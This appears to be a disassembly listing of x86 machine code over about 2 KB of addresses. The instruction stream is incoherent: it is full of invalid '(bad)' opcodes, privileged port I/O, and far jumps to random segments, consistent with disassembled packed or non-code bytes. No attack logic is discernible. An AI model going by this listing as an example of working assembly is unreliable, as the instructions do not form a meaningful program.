  4127d3:	cmp    eax,0xc58118d4
  4127d8:	inc    esi
  4127d9:	mov    ch,BYTE PTR [edi+0x60]
  4127dc:	add    al,bh
  4127de:	and    BYTE PTR [edi+0x22c3d96b],dl
  4127e4:	sbb    edi,ecx
  4127e6:	push   esi
  4127e7:	mov    al,ds:0x9411a726
  4127ec:	mov    bh,0x7
  4127ee:	scas   al,BYTE PTR es:[edi]
  4127ef:	into   
  4127f0:	pop    esi
  4127f1:	ds xchg esp,eax
  4127f3:	mov    DWORD PTR [ebx+0x34e81a9e],0x59f34aea
  4127fd:	(bad)  
  4127ff:	(bad)  
  412800:	stos   BYTE PTR es:[edi],al
  412801:	in     eax,dx
  412802:	leave  
  412803:	and    al,0x3c
  412805:	push   es
  412806:	mov    esp,0xb1778425
  41280b:	call   DWORD PTR ds:0x5e504406
  412811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412812:	jmp    0x4127be
  412814:	jl     0x4127f1
  412816:	jmp    0x714:0x9525e684
  41281d:	sbb    ebp,DWORD PTR [ebx+ebp*4]
  412820:	dec    edi
  412821:	mov    al,0x9e
  412823:	test   al,0xc5
  412825:	xchg   si,ax
  412827:	fcomi  st,st(2)
  412829:	in     eax,dx
  41282a:	or     ah,BYTE PTR [ecx+0x39746cb1]
  412830:	int    0xb5
  412832:	cld    
  412833:	adc    ebx,DWORD PTR [ebx]
  412835:	adc    BYTE PTR [ecx-0x76009b19],dh
  41283b:	out    dx,al
  41283c:	sub    edx,DWORD PTR [edi+0x49]
  41283f:	aad    0xe
  412841:	popf   
  412842:	xor    al,0xe3
  412844:	ss (bad) 
  412847:	pushf  
  412848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412849:	xor    BYTE PTR ds:0x1ca5f47c,bl
  412850:	mov    ds:0xf0f34f05,eax
  412855:	out    dx,al
  412856:	cmc    
  412857:	scas   eax,DWORD PTR es:[edi]
  412858:	arpl   WORD PTR [edi+0x847f5a4],bp
  41285e:	xchg   DWORD PTR [ebp-0x41417b14],esp
  412864:	sti    
  412865:	mov    ds:0x86d88f69,eax
  41286a:	xor    eax,0x2aba535a
  41286f:	sahf   
  412870:	fadd   st,st(6)
  412872:	push   ds
  412873:	pop    esp
  412874:	inc    ecx
  412875:	mov    ds:0x14540cb5,al
  41287a:	mov    WORD PTR [eax+0x70],fs
  41287d:	xlat   BYTE PTR ds:[ebx]
  41287e:	add    ah,cl
  412880:	and    DWORD PTR ds:0xb11c9d28,esi
  412886:	mov    edi,0x5fe292e8
  41288b:	call   0x2331:0x1ef3314e
  412892:	mov    ah,dh
  412894:	mov    ?,WORD PTR [esi]
  412896:	mov    edi,0xac7ea52a
  41289b:	mov    eax,ds:0xea2d8a85
  4128a0:	enter  0x8d63,0xa4
  4128a4:	ss pop es
  4128a6:	push   esp
  4128a7:	add    DWORD PTR [ecx+ebp*1+0x58a6c992],0x6be581a9
  4128b2:	jb     0x41290f
  4128b4:	pop    es
  4128b5:	lds    ecx,FWORD PTR [edi+0x6afc567c]
  4128bb:	cmc    
  4128bc:	add    esi,0xffffffce
  4128bf:	ss push esp
  4128c1:	fldcw  WORD PTR [ebx-0x20210865]
  4128c7:	mov    eax,ds:0xa9585f68
  4128cc:	pop    ss
  4128cd:	iret   
  4128ce:	test   BYTE PTR [ecx-0x1633ac23],ch
  4128d4:	xchg   DWORD PTR ss:[eax],edx
  4128d7:	sub    ch,0x64
  4128da:	mov    al,0x77
  4128dc:	ja     0x412908
  4128de:	and    eax,0x7f4796f5
  4128e3:	out    dx,eax
  4128e4:	ins    DWORD PTR es:[edi],dx
  4128e5:	inc    ecx
  4128e6:	inc    eax
  4128e7:	mov    WORD PTR [ecx-0x23],fs
  4128ea:	pop    ss
  4128eb:	loope  0x412887
  4128ed:	aaa    
  4128ee:	jge    0x41289f
  4128f0:	inc    ebp
  4128f1:	ins    BYTE PTR es:[edi],dx
  4128f2:	iret   
  4128f3:	mov    WORD PTR [ecx-0xc],?
  4128f6:	test   bh,dl
  4128f8:	sub    BYTE PTR [edx+0x17820b3a],dh
  4128fe:	mov    al,ds:0xc944754e
  412903:	icebp  
  412904:	outs   dx,BYTE PTR ds:[esi]
  412905:	leave  
  412906:	jmp    0xa4bf:0x5b573fea
  41290d:	loope  0x4128a2
  41290f:	pusha  
  412910:	test   edi,ebp
  412912:	jl     0x412908
  412914:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  412916:	not    DWORD PTR [edi+ecx*2+0x4c75db05]
  41291d:	bnd jg 0x41291e
  412920:	adc    edx,esi
  412922:	sub    eax,0xd88aae24
  412927:	sti    
  412928:	mov    esp,0x5313cf0a
  41292d:	inc    esi
  41292e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41292f:	lods   ax,WORD PTR ds:[esi]
  412931:	mov    esp,0xfbe5c771
  412936:	jns    0x412981
  412938:	sbb    BYTE PTR [esi-0x7eadcd13],al
  41293e:	ins    DWORD PTR es:[edi],dx
  41293f:	mov    bl,BYTE PTR [esi-0x9b70764]
  412945:	mov    eax,ds:0x8a20beea
  41294a:	je     0x41298f
  41294c:	test   al,0x7c
  41294e:	pop    eax
  41294f:	xchg   edx,eax
  412950:	mov    WORD PTR [ebx+0x1f],ss
  412953:	adc    al,0x54
  412955:	mov    ecx,0x5af1d12
  41295a:	mov    bh,0xef
  41295c:	iret   
  41295d:	arpl   WORD PTR [eax+0x4f50ff6d],di
  412963:	push   cs
  412964:	ror    DWORD PTR [eax],1
  412966:	mov    ecx,0x73d3d622
  41296b:	inc    ebp
  41296c:	(bad)  
  41296d:	and    al,0x35
  41296f:	nop
  412970:	adc    al,0x80
  412972:	push   es
  412973:	ret    0xb21a
  412976:	sub    DWORD PTR [eax],esp
  412978:	test   eax,0x3e4fcc02
  41297d:	cwde   
  41297e:	out    0xcc,al
  412980:	or     dl,dl
  412982:	les    esp,FWORD PTR [edi-0x57]
  412985:	test   BYTE PTR [eax+0x58],bl
  412988:	push   esi
  412989:	sbb    al,0x3e
  41298b:	xchg   DWORD PTR [ebp-0xa],ecx
  41298e:	sub    DWORD PTR [edx],0xffffffa0
  412991:	or     esp,DWORD PTR [eax]
  412993:	imul   edx,DWORD PTR [esi+0x69],0x63
  412997:	out    dx,al
  412998:	jg     0x412936
  41299a:	pop    ecx
  41299b:	adc    ah,BYTE PTR ds:0x3e5912cf
  4129a1:	enter  0x7d78,0x2e
  4129a5:	retf   
  4129a6:	pop    ds
  4129a7:	mov    esp,0x5be33206
  4129ac:	test   BYTE PTR [ecx+eax*1],ah
  4129af:	hlt    
  4129b0:	stos   BYTE PTR es:[edi],al
  4129b1:	shr    dh,0x10
  4129b4:	(bad)  
  4129b5:	out    dx,eax
  4129b6:	xlat   BYTE PTR ds:[ebx]
  4129b7:	or     eax,0x888d6ee4
  4129bc:	mov    DWORD PTR [edx-0x7f],ecx
  4129bf:	js     0x412a00
  4129c1:	inc    ecx
  4129c2:	sub    eax,0x9c4c4a32
  4129c7:	mov    edx,0xadfac82b
  4129cc:	sbb    eax,0x217e677b
  4129d1:	rcr    BYTE PTR [edi+0x31],cl
  4129d4:	scas   al,BYTE PTR es:[edi]
  4129d5:	mov    edx,0x902fb807
  4129da:	mov    ebx,0x8f6d8e66
  4129df:	hlt    
  4129e0:	xchg   esi,eax
  4129e1:	std    
  4129e2:	and    al,0x6b
  4129e4:	dec    ebp
  4129e5:	(bad)  
  4129e6:	aam    0x14
  4129e8:	and    BYTE PTR [edx+edi*4-0x3e],bh
  4129ec:	fst    DWORD PTR [ecx+0x67]
  4129ef:	cmp    eax,0x2e4a8815
  4129f4:	gs push 0xffffff92
  4129f7:	out    0x47,eax
  4129f9:	xor    esp,DWORD PTR [ebp+0x704c865a]
  4129ff:	ins    BYTE PTR es:[edi],dx
  412a00:	fist   DWORD PTR [ecx-0x5a86da64]
  412a06:	fldenv [ebp+edx*4-0x75601d88]
  412a0d:	sbb    al,0x7a
  412a0f:	imul   edx,DWORD PTR [bp-0x7f73],0xffffff82
  412a15:	and    bl,BYTE PTR [eax-0x6798b8c1]
  412a1b:	call   0xb99c:0xa6ccddb0
  412a22:	inc    esp
  412a23:	jbe    0x412a4e
  412a25:	iret   
  412a26:	in     eax,0xc4
  412a28:	mov    esp,0x5651afc5
  412a2d:	bound  edx,QWORD PTR [edi-0x6c66c5e9]
  412a33:	mov    ecx,0x3fdfb291
  412a38:	bound  esi,QWORD PTR [ebx+0x55]
  412a3b:	inc    ebx
  412a3c:	ins    DWORD PTR es:[edi],dx
  412a3d:	mov    al,0x4b
  412a3f:	enter  0x5c0a,0xca
  412a43:	mov    ebp,0xc4b4fc9e
  412a48:	inc    edx
  412a49:	mov    edi,0x3efd1425
  412a4e:	shl    DWORD PTR [ebp-0x57],0x70
  412a52:	out    0xbd,al
  412a54:	fwait
  412a55:	shl    BYTE PTR [eax+0x34a35d2c],1
  412a5b:	jb     0x412a87
  412a5d:	sbb    dh,bl
  412a5f:	pop    esp
  412a60:	adc    eax,0xec8782a0
  412a65:	fnstenv [edx+0x757b4d82]
  412a6b:	fimul  DWORD PTR [eax+0x4b]
  412a6e:	daa    
  412a6f:	sub    BYTE PTR [eax],0xb1
  412a72:	sub    BYTE PTR [ecx+ebp*4],bl
  412a75:	sti    
  412a76:	mov    ebp,0xff67c6c6
  412a7b:	pop    ss
  412a7c:	mov    bh,al
  412a7e:	adc    DWORD PTR [esi-0x2b],0xd2426d41
  412a85:	mov    dh,0xe2
  412a88:	(bad)  
  412a89:	mov    ebp,0x25453a5f
  412a8e:	mov    ah,0xe7
  412a90:	cmp    dl,bh
  412a92:	in     al,dx
  412a93:	jle    0x412afc
  412a95:	das    
  412a96:	xchg   esi,eax
  412a97:	jns    0x412b01
  412a99:	sbb    al,0x3b
  412a9b:	hlt    
  412a9c:	in     eax,0x80
  412a9e:	mov    edi,DWORD PTR [edx+0x62]
  412aa1:	out    0xce,al
  412aa3:	fwait
  412aa4:	mov    BYTE PTR [eax-0x1c],bh
  412aa7:	(bad)  
  412aa8:	xor    esp,DWORD PTR [eax-0x270005d0]
  412aae:	mov    edi,0xcc0c3d5f
  412ab3:	stos   BYTE PTR es:[edi],al
  412ab4:	xor    bl,ch
  412ab6:	or     ecx,edx
  412ab8:	js     0x412a55
  412aba:	out    0xf9,al
  412abc:	adc    DWORD PTR [esi-0x312f5160],0x7
  412ac3:	dec    ecx
  412ac4:	xlat   BYTE PTR ds:[ebx]
  412ac5:	ins    DWORD PTR es:[edi],dx
  412ac6:	jmp    FWORD PTR [edx+eiz*4]
  412ac9:	fisubr DWORD PTR [eax-0x3d]
  412acc:	xchg   edi,eax
  412acd:	fidiv  WORD PTR [esi-0x2dca254]
  412ad3:	inc    esi
  412ad4:	push   ebp
  412ad5:	mov    WORD PTR [ebx+0x2a],?
  412ad8:	mov    ch,BYTE PTR [eiz*2-0x685ef66c]
  412adf:	jle    0x412b16
  412ae1:	inc    esp
  412ae2:	jle    0x412adc
  412ae4:	mov    dh,0xcd
  412ae6:	je     0x412b3a
  412ae8:	mov    BYTE PTR [ebp+esi*4+0x29],dh
  412aec:	mov    cs,WORD PTR [edx]
  412aee:	push   ebp
  412aef:	lds    edx,FWORD PTR [esi]
  412af1:	adc    eax,0xe9680814
  412af6:	or     dl,BYTE PTR [ecx-0x71]
  412af9:	out    dx,al
  412afa:	fcmovne st,st(6)
  412afc:	aaa    
  412afd:	or     al,0x9f
  412aff:	sub    DWORD PTR [edx-0x6ce48d53],ebp
  412b05:	push   0x4e9b56e7
  412b0a:	add    BYTE PTR [eax-0x85f4970],0x88
  412b11:	push   edi
  412b12:	adc    ch,BYTE PTR ds:0x83a48c3a
  412b18:	pusha  
  412b19:	sub    eax,0xb7a92814
  412b1e:	mov    ecx,0x65adc096
  412b23:	xor    al,ah
  412b25:	push   edi
  412b26:	mov    al,ds:0xec448d4e
  412b2b:	scas   eax,DWORD PTR es:[edi]
  412b2c:	pop    ds
  412b2d:	mov    eax,0x884260d0
  412b32:	and    DWORD PTR [ecx-0x1d],eax
  412b35:	fs inc eax
  412b37:	addr16 dec esi
  412b39:	dec    ebp
  412b3a:	jno    0x412ae6
  412b3c:	(bad)  
  412b3e:	xlat   BYTE PTR ds:[ebx]
  412b3f:	test   DWORD PTR [edi],edx
  412b41:	or     al,0x1a
  412b43:	sbb    edx,edx
  412b45:	sub    eax,0x5e320015
  412b4a:	hlt    
  412b4b:	cmp    eax,0x67e2cef2
  412b50:	mov    esp,0x184128c7
  412b55:	int    0x71
  412b57:	into   
  412b58:	ror    DWORD PTR [ebx+0x69a2e303],cl
  412b5e:	pop    ss
  412b5f:	retf   0xcd17
  412b62:	push   es
  412b63:	xor    BYTE PTR [ebp+0x260a2352],ch
  412b69:	dec    edi
  412b6a:	mov    esp,esp
  412b6c:	cdq    
  412b6d:	jo     0x412b18
  412b6f:	sbb    bh,BYTE PTR [esi-0x2e]
  412b72:	jae    0x412b08
  412b74:	test   DWORD PTR [esi+0x37],edx
  412b77:	add    esp,esi
  412b79:	aad    0x9a
  412b7b:	cdq    
  412b7c:	cmp    DWORD PTR [edi-0x64],eax
  412b7f:	sub    DWORD PTR [eax+0x11],edx
  412b82:	jecxz  0x412b09
  412b84:	scas   al,BYTE PTR es:[edi]
  412b85:	stos   DWORD PTR es:[edi],eax
  412b86:	les    eax,FWORD PTR [edi+0x5bd9eb8b]
  412b8c:	sar    DWORD PTR [ebx-0x4d],cl
  412b8f:	pop    eax
  412b90:	mul    DWORD PTR [ebx]
  412b92:	xlat   BYTE PTR ds:[ebx]
  412b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b94:	pop    esp
  412b95:	and    edx,DWORD PTR [esi]
  412b97:	mov    cl,0x4a
  412b99:	adc    BYTE PTR [edx+0x60],0xbc
  412b9d:	sbb    BYTE PTR [ebp+0x15311d6c],dl
  412ba3:	in     eax,dx
  412ba4:	mov    esp,0xbd60b448
  412ba9:	ins    DWORD PTR es:[edi],dx
  412baa:	fs dec esi
  412bac:	sub    eax,0xf0365ae4
  412bb1:	and    al,0x7b
  412bb3:	add    BYTE PTR [ebx+ebp*1-0x3eb0a7a8],dh
  412bba:	push   0xa698a233
  412bbf:	test   eax,0x9944f071
  412bc4:	popa   
  412bc5:	push   ebp
  412bc6:	jp     0x412b7e
  412bc8:	inc    sp
  412bca:	jl     0x412b81
  412bcc:	jbe    0x412c1d
  412bce:	outs   dx,DWORD PTR ds:[esi]
  412bcf:	adc    eax,0x79b69386
  412bd4:	sub    ebp,ecx
  412bd6:	sahf   
  412bd7:	mov    dl,BYTE PTR [esi]
  412bd9:	test   DWORD PTR [ecx],ebx
  412bdb:	fiadd  DWORD PTR [ebx-0x41]
  412bde:	out    0x33,al
  412be0:	ret    0x2e20
  412be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412be4:	mov    al,0x78
  412be6:	mov    edi,0xb8cbee8a
  412beb:	(bad)  
  412bec:	fst    QWORD PTR [edx-0x11]
  412bef:	sbb    al,0x6b
  412bf1:	ins    DWORD PTR es:[edi],dx
  412bf2:	inc    ecx
  412bf3:	sbb    eax,0x5d6ee903
  412bf8:	lock loope 0x412c3c
  412bfb:	vhsubps ymm1,ymm0,YMMWORD PTR [ebp+0x74]
  412c00:	push   0x4449d41b
  412c05:	adc    al,0xb8
  412c07:	pop    esi
  412c08:	jns    0x412be6
  412c0a:	and    eax,0x7d85fd27
  412c0f:	mov    edi,0x1967af0c
  412c14:	lods   eax,DWORD PTR ds:[esi]
  412c15:	loopne 0x412bf3
  412c17:	fild   WORD PTR [ecx-0x177aa5d9]
  412c1d:	iret   
  412c1e:	jmp    0xca21:0xe7d2f42b
  412c25:	mul    DWORD PTR [edx-0x3c724eab]
  412c2b:	fdivr  st,st(7)
  412c2d:	pop    ss
  412c2e:	pop    ds
  412c2f:	xor    esp,edi
  412c31:	fisub  DWORD PTR [edx+0x3646939e]
  412c37:	popf   
  412c38:	scas   eax,DWORD PTR es:[edi]
  412c39:	cmp    eax,0xa257d1f3
  412c3e:	xchg   esp,eax
  412c3f:	or     BYTE PTR [ebx],dh
  412c41:	ret    
  412c42:	mov    dl,0xf4
  412c44:	mov    ebx,0xa7281f77
  412c49:	fs jl  0x412c12
  412c4c:	adc    DWORD PTR [eax],0x1
  412c4f:	inc    ecx
  412c50:	test   al,0x3e
  412c52:	gs test eax,0x617ba32a
  412c58:	into   
  412c59:	lods   al,BYTE PTR ds:[esi]
  412c5a:	or     DWORD PTR [eax-0x51],eax
  412c5d:	aam    0x3
  412c5f:	shl    BYTE PTR [ecx-0x68],cl
  412c62:	outs   dx,BYTE PTR ds:[esi]
  412c63:	cld    
  412c64:	fistp  QWORD PTR [edx+0x21]
  412c67:	push   ss
  412c68:	and    bh,cl
  412c6a:	push   edx
  412c6b:	rcl    DWORD PTR ds:0x2457d352,0x32
  412c72:	mov    ebx,0x5ed12fa1
  412c77:	push   ss
  412c78:	lods   eax,DWORD PTR ds:[esi]
  412c79:	push   ecx
  412c7a:	daa    
  412c7b:	data16 (bad) 
  412c7d:	popf   
  412c7e:	shl    DWORD PTR [edx-0x3b447583],cl
  412c84:	and    BYTE PTR [ecx+0x23ab10b0],dl
  412c8a:	dec    ecx
  412c8b:	xchg   ecx,eax
  412c8c:	fild   WORD PTR [ebx-0xfef0623]
  412c92:	std    
  412c93:	stos   DWORD PTR es:[edi],eax
  412c94:	xchg   ecx,eax
  412c95:	mov    ah,0xc3
  412c97:	adc    eax,DWORD PTR [esi+eiz*8-0x6f]
  412c9b:	pop    ds
  412c9c:	adc    DWORD PTR [edi],eax
  412c9e:	sar    DWORD PTR [edx],cl
  412ca0:	pop    ds
  412ca1:	call   0xd9d6:0x9bc64b30
  412ca8:	(bad)  
  412ca9:	je     0x412c42
  412cab:	jecxz  0x412d02
  412cad:	xor    eax,0x3ddd2522
  412cb2:	inc    edx
  412cb3:	and    DWORD PTR [ebx],ecx
  412cb5:	xor    DWORD PTR [ecx-0xaa3e01d],0xfffffff7
  412cbc:	fld    TBYTE PTR ds:0x276062db
  412cc2:	popf   
  412cc3:	pop    ecx
  412cc4:	std    
  412cc5:	xchg   DWORD PTR [edi+0x25],esi
  412cc8:	call   0xe64ed012
  412ccd:	xor    dl,BYTE PTR [ebp+0x18c212cf]
  412cd3:	ja     0x412c92
  412cd5:	jecxz  0x412cb0
  412cd7:	in     al,dx
  412cd8:	mov    bh,0xe8
  412cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cdb:	ret    
  412cdc:	lea    esp,[ebx-0x5ab1a6c2]
  412ce2:	cmp    ch,BYTE PTR [edi+0x3a]
  412ce5:	push   ds
  412ce6:	sbb    eax,0x3b74d4
  412ceb:	lds    ecx,FWORD PTR [edi+ebp*2+0x35]
  412cef:	(bad)  
  412cf0:	sbb    edi,DWORD PTR [edx]
  412cf2:	ret    0x9c12
  412cf5:	adc    al,0x9a
  412cf7:	mov    bl,0xcf
  412cf9:	xor    eax,0x7c3a0ca0
  412cfe:	js     0x412d2b
  412d00:	fcomp  QWORD PTR [edi]
  412d02:	inc    esi
  412d03:	pushf  
  412d04:	mov    eax,DWORD PTR [esi+ecx*4]
  412d07:	ds dec esi
  412d09:	lods   al,BYTE PTR ds:[esi]
  412d0a:	rcr    edx,1
  412d0c:	inc    ebx
  412d0d:	fisubr WORD PTR [ebx]
  412d0f:	dec    esp
  412d10:	inc    esp
  412d11:	push   eax
  412d12:	lods   al,BYTE PTR ds:[esi]
  412d13:	stc    
  412d14:	inc    eax
  412d15:	clc    
  412d16:	mov    ds:0xd82c12c,eax
  412d1b:	jb     0x412d61
  412d1d:	push   ebp
  412d1e:	sti    
  412d1f:	mov    dl,0x2f
  412d21:	or     al,0x5
  412d23:	lahf   
  412d24:	xor    edi,ebp
  412d26:	xchg   ebx,eax
  412d27:	jno    0x412da1
  412d29:	push   es
  412d2a:	or     dl,ah
  412d2c:	std    
  412d2d:	inc    eax
  412d2e:	cmc    
  412d2f:	sti    
  412d30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d31:	and    al,0x66
  412d33:	lods   al,BYTE PTR ds:[esi]
  412d34:	dec    esi
  412d35:	jge    0x412d6f
  412d37:	adc    BYTE PTR [eax*8-0x7adfbe6b],0xd3
  412d3f:	xor    cl,BYTE PTR [edx+0x15]
  412d42:	add    DWORD PTR [eax*2-0x78956e11],0xffffffb7
  412d4a:	ud2    
  412d4c:	jo     0x412ce1
  412d4e:	inc    edi
  412d4f:	mov    edi,0x5449a406
  412d54:	scas   al,BYTE PTR es:[edi]
  412d55:	aaa    
  412d56:	xor    DWORD PTR [ebx],edx
  412d58:	mov    esi,0x11bf0497
  412d5d:	adc    al,cl
  412d5f:	push   ebp
  412d60:	cld    
  412d61:	pop    es
  412d62:	mov    ah,BYTE PTR [eax+0x24]
  412d65:	jmp    0x50c1:0xa5bd9f1a
  412d6c:	inc    esi
  412d6d:	and    edx,ecx
  412d6f:	fidivr DWORD PTR [ebx]
  412d71:	sbb    ebp,edx
  412d73:	cmp    al,BYTE PTR [edx+edx*4-0x2a]
  412d77:	out    0x4d,al
  412d79:	xor    eax,0x6ce577ac
  412d7e:	cli    
  412d7f:	adc    DWORD PTR gs:[ebx],0x80a4dd93
  412d86:	ja     0x412d2a
  412d88:	jne    0x412d12
  412d8a:	push   cs
  412d8b:	mov    edx,DWORD PTR [ebx]
  412d8d:	mov    ebp,0x1c579cda
  412d92:	aaa    
  412d93:	mov    al,ds:0x17b516ea
  412d98:	xor    ebp,ecx
  412d9a:	mov    eax,ds:0xb3020687
  412d9f:	jns    0x412d7f
  412da1:	outs   dx,BYTE PTR ds:[esi]
  412da2:	out    dx,eax
  412da3:	xchg   ebx,eax
  412da4:	inc    esi
  412da5:	sti    
  412da6:	dec    edi
  412da7:	sti    
  412da8:	xor    dh,BYTE PTR [edi-0x59]
  412dab:	inc    eax
  412dac:	fmul   DWORD PTR [ebx-0x5e5255b3]
  412db2:	and    dl,BYTE PTR ds:0xe084e0f3
  412db8:	jmp    0x412e1a
  412dba:	lea    ebx,[ebp-0x79]
  412dbd:	xor    ebp,DWORD PTR [edi+0x73]
  412dc0:	mov    al,0xae
  412dc2:	iret   
  412dc3:	sub    al,0x40
  412dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dc6:	push   edx
  412dc7:	test   DWORD PTR [ebx-0x2868342e],ecx
  412dcd:	repnz dec edx
  412dcf:	fistp  WORD PTR [esp+esi*1+0x3a]
  412dd3:	push   es
  412dd4:	push   ebp
  412dd5:	fisubr WORD PTR [ebx-0x49675fbc]
  412ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ddc:	pop    esp
  412ddd:	lea    ebp,[esi-0x44]
  412de0:	pop    esi
  412de1:	sar    WORD PTR [edx],1
  412de4:	inc    ebx
  412de5:	and    DWORD PTR [ebp+0x5bbf4a04],0x5506879c
  412def:	jle    0x412e0b
  412df1:	xchg   BYTE PTR [ebp+0x6b],ah
  412df4:	fmul   st,st(3)
  412df6:	jle    0x412e24
  412df8:	in     al,dx
  412df9:	sahf   
  412dfa:	lea    ebx,[eax+ebx*2]
  412dfd:	mov    ecx,0x7506d163
  412e02:	popa   
  412e03:	add    DWORD PTR [edi+0x50],edi
  412e06:	std    
  412e07:	mov    ebp,0x99fabb43
  412e0c:	into   
  412e0d:	xlat   BYTE PTR ds:[ebx]
  412e0e:	ins    DWORD PTR es:[edi],dx
  412e0f:	mov    ebp,0x7ef441d9
  412e14:	sti    
  412e15:	pop    ecx
  412e16:	dec    ebx
  412e17:	and    DWORD PTR [edx-0x5cad5471],ebp
  412e1d:	leave  
  412e1e:	daa    
  412e1f:	popa   
  412e20:	dec    edi
  412e21:	gs (bad) 
  412e23:	push   0xa7ebf574
  412e28:	clc    
  412e29:	cs xor al,0x38
  412e2c:	inc    edx
  412e2d:	addr16 inc esp
  412e2f:	push   es
  412e30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e31:	jno    0x412dc5
  412e33:	scas   eax,DWORD PTR es:[edi]
  412e34:	pop    esp
  412e35:	push   ds
  412e36:	pop    esi
  412e37:	jae    0x412e95
  412e39:	dec    eax
  412e3a:	jns    0x412e09
  412e3c:	jp     0x412e5a
  412e3e:	popf   
  412e3f:	pop    ss
  412e40:	rcl    DWORD PTR [edx+0x7a],cl
  412e43:	mov    DWORD PTR [ebx-0x3fdf93a7],ebp
  412e49:	or     eax,0x37475ffb
  412e4e:	ds inc esi
  412e50:	add    al,0xd6
  412e52:	ror    BYTE PTR [esi+0x351dfac1],1
  412e58:	xor    edx,eax
  412e5a:	adc    bl,BYTE PTR [ebx]
  412e5c:	retf   0x663b
  412e5f:	test   al,0x9f
  412e61:	je     0x412edf
  412e63:	add    ah,BYTE PTR [eax-0x43ecaddf]
  412e69:	jmp    0x6f5:0xa44c3e1d
  412e70:	les    eax,FWORD PTR [esi+0x726c2432]
  412e76:	cmp    ecx,DWORD PTR [ebx]
  412e78:	jne    0x412e24
  412e7a:	and    DWORD PTR [edi-0x4b],eax
  412e7d:	inc    edx
  412e7e:	lods   eax,DWORD PTR ds:[esi]
  412e7f:	jp     0x412e37
  412e81:	daa    
  412e82:	pop    esi
  412e83:	aaa    
  412e84:	mov    BYTE PTR [edi-0x56],ah
  412e87:	sub    esp,DWORD PTR [ecx+0x4ab3f588]
  412e8d:	les    ebp,FWORD PTR [esi+edi*4]
  412e90:	les    ebp,FWORD PTR [ebx+0x28]
  412e93:	test   al,0x64
  412e95:	xor    dl,BYTE PTR [edi-0x13b136dc]
  412e9b:	mov    ds:0x38b680c9,eax
  412ea0:	xchg   edx,eax
  412ea1:	and    BYTE PTR [esi+0x1a],cl
  412ea4:	or     BYTE PTR [ecx+ebx*8],ch
  412ea7:	pop    ss
  412ea8:	push   edi
  412ea9:	bound  ebx,QWORD PTR [eax-0x9]
  412eac:	adc    DWORD PTR [edi+ecx*1-0x6],ebp
  412eb0:	xchg   DWORD PTR ds:0x1b019977,esi
  412eb6:	sahf   
  412eb7:	push   es
  412eb8:	push   ecx
  412eb9:	bound  ecx,QWORD PTR [esi-0x74857210]
  412ebf:	and    DWORD PTR [ebp-0x29],ecx
  412ec2:	cmp    BYTE PTR [eax-0x4b],al
  412ec5:	xchg   edx,eax
  412ec6:	inc    edx
  412ec7:	cli    
  412ec8:	push   ebp
  412ec9:	out    dx,al
  412eca:	fcmovu st,st(0)
  412ecc:	push   edx
  412ecd:	and    ecx,DWORD PTR [ebx+0x3259778c]
  412ed3:	mov    al,0x2b
  412ed5:	imul   esi,DWORD PTR [ebp+0x345982e1],0x4f0e5c41
  412edf:	fs and edx,ecx
  412ee2:	mov    ebp,0x717c5345
  412ee7:	je     0x412f3d
  412ee9:	int3   
  412eea:	mov    ss,WORD PTR [ebx+0x50]
  412eed:	mov    WORD PTR [ebx+0x11],ds
  412ef0:	push   esp
  412ef1:	mov    ebx,0x4fd92e6c
  412ef6:	ins    DWORD PTR es:[edi],dx
  412ef7:	pushf  
  412ef8:	mov    al,ds:0x70a4a2d3
  412efd:	and    ebx,eax
  412eff:	inc    esi
  412f00:	sub    BYTE PTR [eax+0x72d330bc],ah
  412f06:	adc    eax,0x5e7ec889
  412f0b:	and    eax,0x77a121f9
  412f10:	xor    BYTE PTR [ecx+edx*8+0x7d],bl
  412f14:	xor    BYTE PTR [edi],ah
  412f16:	lods   eax,DWORD PTR ds:[esi]
  412f17:	jmp    0xc84e:0x5e335b8c
  412f1e:	add    bl,BYTE PTR [ecx-0x56481c4d]
  412f24:	aaa    
  412f25:	aam    0x95
  412f27:	inc    ebp
  412f28:	mov    bh,0x1c
  412f2a:	test   BYTE PTR [esi+0x429bc6ff],bl
  412f30:	push   0xf41bf14a
  412f35:	(bad)  
  412f36:	sbb    ah,dh
  412f38:	push   cs
  412f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f3a:	sub    esi,DWORD PTR [edx+eax*1]
  412f3d:	test   DWORD PTR [edi-0x11],0x9fb0fbe5
  412f44:	adc    esi,ebx
  412f46:	les    edx,FWORD PTR [eax]
  412f48:	jecxz  0x412eef
  412f4a:	xchg   DWORD PTR [edi-0x8],esp
  412f4d:	sbb    BYTE PTR fs:[ecx+ebx*1+0x28afcadd],dl
  412f55:	xchg   edi,eax
  412f56:	sbb    edx,DWORD PTR [eax]
  412f58:	pushf  
  412f59:	test   al,0xf5
  412f5b:	jmp    0xb296:0x2e5b42fc
  412f62:	or     DWORD PTR [edx+0x2b41a4c0],edx
  412f68:	rol    DWORD PTR [esi+eax*2-0x1a0a5bcb],cl
  412f6f:	mov    bh,0x30
  412f71:	pop    ecx
  412f72:	and    DWORD PTR [edi+0x38f6dbcb],ebp
  412f78:	mov    ds:0x52c9beac,al
  412f7d:	fstp   DWORD PTR [edx-0x29]
  412f80:	loope  0x412fc5
  412f82:	pop    ebx
  412f83:	ins    BYTE PTR es:[edi],dx
  412f84:	call   0xf314d45d
  412f89:	push   ebp
  412f8a:	int    0x31
  412f8c:	jmp    0xa3d8:0x72405a3c
  412f93:	inc    ebp
  412f94:	add    DWORD PTR [edx],edx
  412f96:	clc    
  412f97:	jb     0x412f88
  412f99:	and    al,0x71
  412f9b:	push   esp
  412f9c:	and    esp,DWORD PTR [edi+0xb65cfc4]
  412fa2:	pop    eax
  412fa3:	hlt    
  412fa4:	test   ah,ah
  412fa6:	or     dl,BYTE PTR [ebp+0x23]
  412fa9:	cld    
  412faa:	mov    DWORD PTR [ebp-0xa],0x5a74e4c5
  412fb1:	xchg   edx,eax
  412fb2:	shr    DWORD PTR [edi-0x7c123fbb],cl
  412fb8:	retf   
